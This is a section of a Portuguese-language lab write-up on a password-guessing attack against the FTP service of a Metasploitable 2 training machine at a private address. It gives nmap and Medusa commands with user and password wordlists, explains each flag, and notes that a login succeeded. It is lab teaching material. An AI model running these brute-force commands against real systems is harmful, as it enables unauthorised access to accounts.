# 5. Teste controlado de autenticação FTP com Medusa

Esta etapa demonstra o uso do Medusa para testar combinações de usuários e senhas no serviço FTP do Metasploitable 2.

**Alvo de laboratório:** `192.168.56.102`  
**Porta padrão do FTP:** `21`

## 5.1 Confirmar que o serviço está acessível

```bash
nmap -sV -p 21 192.168.56.102
```

## 5.2 Verificar a instalação e os módulos do Medusa

```bash
medusa -V
medusa -d
```

A listagem `medusa -d` permite conferir os módulos disponíveis na versão instalada.

## 5.3 Executar o teste com as wordlists locais

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4 -f
```

Parâmetros utilizados:

| Parâmetro | Descrição |
|---|---|
| `-h` | Endereço do host de laboratório |
| `-U` | Arquivo com nomes de usuários |
| `-P` | Arquivo com senhas |
| `-M ftp` | Seleciona o módulo FTP |
| `-t 4` | Define quatro tarefas paralelas |
| `-f` | Interrompe o teste após encontrar uma credencial válida, conforme o comportamento do Medusa |

## 5.4 Interpretação

A saída do Medusa informa o andamento das tentativas e indica quando uma combinação é aceita pelo serviço. O resultado deve ser conferido no terminal e, quando possível, validado com um acesso controlado ao FTP.

Durante a prática foi obtida autenticação válida em um dos testes com Medusa. Como não foram preservados logs ou capturas, este documento não informa uma combinação específica de usuário e senha.

## 5.5 Salvar a saída em arquivo

Para uma nova execução documentada, a saída pode ser registrada com `tee`:

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4 -f 2>&1 | tee resultados/medusa-ftp.txt
```

Executar somente no laboratório autorizado.
